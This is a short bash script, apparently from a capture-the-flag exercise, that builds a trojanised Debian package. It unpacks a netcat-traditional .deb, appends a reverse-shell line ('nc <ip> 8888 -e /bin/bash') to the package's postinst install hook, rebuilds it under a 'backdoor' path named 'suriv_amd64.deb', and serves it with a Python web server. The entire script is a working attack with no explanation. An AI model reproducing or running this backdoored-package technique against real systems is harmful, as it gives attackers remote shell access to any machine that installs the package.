#!/usr/bin/bash
# Start at the right place
cd $HOME/debs/
# Unpack the deb package components
export MYDEB=netcat-traditional_1.10-41.1ubuntu1_amd64.deb 
mkdir packing
cd packing
cp ../$MYDEB .
dpkg -x $MYDEB work
mkdir -p work/DEBIAN
ar -x $MYDEB
tar -xf control.tar.xz ./control
tar -xf control.tar.xz ./postinst
mv control work/DEBIAN/
mv postinst work/DEBIAN/
# Add the reverse shell command to postinst
export my_ip=`hostname -I`
echo "/bin/nc ${my_ip} 8888 -e /bin/bash" >> work/DEBIAN/postinst
# Build the package
dpkg-deb --build work/
# Create the path the rogue host is requesting
mkdir -p $HOME/web/pub/jfrost/backdoor/
# Move the malicious package file into place
mv work.deb $HOME/web/pub/jfrost/backdoor/suriv_amd64.deb
# Start the web server
cd $HOME/web/
python3 -m http.server 80
